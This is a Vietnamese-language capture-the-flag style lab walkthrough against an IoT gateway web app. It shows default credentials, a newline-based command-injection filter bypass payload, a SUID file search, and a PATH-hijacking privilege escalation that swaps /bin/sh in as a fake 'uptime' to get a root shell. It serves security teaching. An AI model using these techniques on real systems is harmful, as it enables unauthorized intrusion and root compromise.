# Kịch bản Khai thác (Exploitation Script) - Lab 4.2 Pro: The Mirai Target

Phiên bản nâng cấp Pro này giới thiệu kỹ thuật bypass bộ lọc (filter bypass) và leo thang đặc quyền (Privilege Escalation) từ một user thấp lên quyền root.

## 1. Mục tiêu: IoT Gateway Web (Port 8086)

### Lỗ hổng 1: Command Injection with Filter Bypass
*   **Nguyên nhân:** Nhà phát triển chặn các ký tự `;`, `&`, `|` nhưng quên chặn ký tự xuống dòng (Line Feed - `%0a`).
*   **Hậu quả:** Kẻ tấn công có thể chèn lệnh mới sau ký tự xuống dòng. Tuy nhiên, ứng dụng chạy dưới quyền `iot_user`, nên chỉ đọc được User Flag.

### Lỗ hổng 2: Privilege Escalation via PATH Hijacking (SUID)
*   **Nguyên nhân:** Có một tệp tin chuyên biệt `/usr/bin/iot_sys_helper` được thiết lập quyền SUID root. Tệp này thực thi lệnh `uptime` và `ip` mà không dùng đường dẫn tuyệt đối (absolute path).
*   **Hậu quả:** Kẻ tấn công có thể tạo một tệp tin thực thi giả mạo (ví dụ `uptime`) trong thư mục `/tmp`, sau đó sửa biến môi trường `PATH` để lừa SUID binary chạy tệp giả mạo đó với quyền root.

## 2. Các giai đoạn khai thác:

1.  **Đột nhập:** Đăng nhập với admin/123456.
2.  **Bypass Filter:** Thử chèn lệnh `; id` thất bại do filter. Thử dùng newline: `127.0.0.1%0a id`. Thành công lấy được shell quyền `iot_user`.
3.  **User Flag:** Đọc nội dung `/home/user_flag.txt`.
4.  **Leo thang (Recon):** Tìm các file SUID: `find / -perm -4000 -type f 2>/dev/null`. Phát hiện `/usr/bin/iot_sys_helper`.
5.  **Khai thác PATH:** 
    *   Tạo file `/tmp/uptime` chứa lệnh shell: `cp /bin/sh /tmp/uptime; chmod +x /tmp/uptime`.
    *   Chạy payload: `export PATH=/tmp:$PATH; /usr/bin/iot_sys_helper`.
6.  **Root Flag:** Khi binary chạy tệp mạo danh, ta có shell root. Đọc `/root/root_flag.txt`.
